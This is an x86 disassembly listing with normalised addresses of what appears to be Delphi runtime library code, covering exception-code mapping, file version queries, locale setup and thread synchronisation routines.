pop ecx
mov [ fs : eax ] edx
push sub_40bfeb
lea eax [ ebp - 0x20 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40c038
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40c0d0
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c28b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404304
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40885c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c292
lea eax [ ebp - 0x170 ]
call sub_404094
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_4040b8
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40c29c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c357
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40c038
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bcbc
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
push ebp
call sub_40c0d0
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c35e
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
mov ebx eax
sub_40c378
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c368
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40c0b8
mov eax [ rw-data ]
mov [ eax ] sub_40c29c
mov eax sub_40c004
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40c020
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c3fc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403344
xor eax eax
mov [ rw-data ] eax
sub_40c47c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404304
sub_40c50c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c5e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40412c
lea eax [ ebp - 0x8 ]
call j_sub_404560
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404554
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c5e9
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax ebx
call sub_4026f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c5c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404554
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402714
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c5f8
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c670
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404554
mov edx esi
dec edx
call sub_40c5f8
sub_40c6ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404354
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c6d4
pop esi
pop ebx
retn
mov eax ebx
call sub_404354
mov esi eax
sub_40c6d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404354
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c8e4
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c72c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404354
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c8e4
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c8e4
dec eax
mov ebx eax
sub_40c7bc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404354
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c72c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404354
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c820
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404354
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404354
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c72c
mov eax esi
call sub_404354
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404354
mov [ esp ] eax
jmp r-xdata
sub_40c8a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404554
add eax esi
dec eax
call sub_40c880
sub_40c8e4
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404554
add eax ebx
dec eax
call sub_40c880
add eax ebx
sub_40c920
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404354
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c670
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c954
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404354
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c670
test al al
jne r-xdata
mov eax ebp
call sub_404554
mov dl [ esi + edi - 0x1 ]
call sub_408b3c
test eax eax
setne bl
sub_40c998
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404554
push eax
mov eax esi
call sub_404554
mov ebp eax
mov eax ebp
pop edx
call sub_40ca5c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c9d0
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_408024
mov eax esi
call sub_404354
mov ebp eax
mov eax edi
mov edx ebp
call sub_4046e0
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404560#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404560#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404560#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40ca5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40898c
mov [ esp ] eax
mov eax ebp
call sub_40898c
mov edi eax
mov edx ebp
mov eax esi
call sub_408b50
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c694
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408b50
mov ebx eax
inc ebx
sub_40cafc
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40cb24
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40cb24
test eax eax
jne r-xdata
sub_40cb24
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408b3c
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c694
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408b3c
mov edi eax
test edi edi
jne r-xdata
sub_40cb64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40cbc8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404304
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408378
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbcf
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_40cbd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40cb64
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cc50
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cc38
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40cbd8
pop ecx
push ebp
call sub_40cbd8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402e84
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cdc4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40d08f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cc50
call sub_40b5b0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b500
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040e8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408378
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408378
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b54c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b54c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408378
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b54c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b838
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_4040e8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b838
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_4040e8
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b54c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b500
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_4040e8
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b500
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_4040e8
lea eax [ ebp - 0x8 ]
call sub_404094
lea eax [ ebp - 0xc ]
call sub_404094
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408378
test eax eax
jne r-xdata
call sub_40b788
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40412c
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404414
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404414
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b54c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d096
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_4040b8
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408378
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b500
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408378
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40412c
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40412c
jmp r-xdata
sub_40d144
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d1d4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b4b4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d1db
lea eax [ ebp - 0x14 ]
call sub_404094
retn
sub_40d22c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408918
mov [ rw-data ] eax
sub_40d2b0
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402714
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403334
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_40d318
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d300
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d3a0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e2c
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d2a0
mov [ ebp ] eax
sub_40d3a0
push ebx
mov ebx eax
mov eax ebx
call sub_40d300
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d2a0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d3e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40d454
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_40d4e0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403344
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_40d4e0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d49c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d318
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d2a8
cmp eax 0xffff
jne r-xdata
